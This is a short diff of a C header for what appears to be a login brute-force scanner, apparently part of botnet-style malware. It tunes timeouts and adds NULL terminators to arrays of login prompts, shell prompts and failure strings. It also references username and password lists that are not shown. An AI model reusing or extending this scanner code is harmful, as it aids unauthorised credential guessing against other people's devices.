@@ -5,28 +5,37 @@
 #define SCAN_SCANNER_MAXCON 10 // Maximum connections white bruteforcing
 #define SCAN_SCANNER_TIMEOUT_SEC 5 // Scanner send and recv timeout in seconds
 #define SCAN_SCANNER_TIMEOUT_USEC 0 // Scanner send and recv timeout in useconds
-#define SCAN_SCANNER_STIMEOUT_SEC 5 // Scanner select timeout in seconds
+#define SCAN_SCANNER_STIMEOUT_SEC 1 // Scanner select timeout in seconds
 #define SCAN_SCANNER_STIMEOUT_USEC 0 // Scanner select timeout in useconds
 #define SCAN_SCANNER_PAYLOAD "echo Hello World!\r\n\0"
+
+#ifdef SCANNER_TEST
+#ifndef DEBUG
+#error Including SCANNER_TEST in a non DEBUG build
+#endif
+#endif
 
 #define usersize (sizeof(usernames) / sizeof(unsigned char *))
 #define passsize (sizeof(passwords) / sizeof(unsigned char *))
 
 const static char *userprompts[] =
 {
-	"user",
-	"login",
+	"user\0",
+	"login\0",
+	NULL,
 };
 
 const static char *passprompts[] =
 {
-	"password",
+	"password\0",
+	NULL
 };
 
 const static char *prompts[] =
 {
-	"$",
-	"#",
+	"$\0",
+	"#\0",
+	NULL
 };
 
 const static char *failstrs[] =
@@ -39,6 +48,7 @@ const static char *failstrs[] =
 	"denied",
 	"error",
 	"bad",
+	NULL
 };
 
 const static char *usernames[] =
